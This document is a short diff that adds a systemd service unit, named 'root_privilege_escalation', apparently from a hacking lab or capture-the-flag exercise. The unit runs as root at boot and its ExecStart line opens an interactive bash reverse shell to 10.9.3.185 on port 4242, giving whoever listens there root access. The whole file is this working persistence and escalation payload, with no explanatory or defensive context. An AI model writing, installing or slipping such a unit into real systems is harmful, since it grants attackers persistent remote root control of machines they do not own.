@@ -1,0 +1,11 @@
+[Unit]
+Description=root_privilege_escalation
+
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.185/4242 0>&1'
+
+[Install]
+WantedBy=multi-user.target
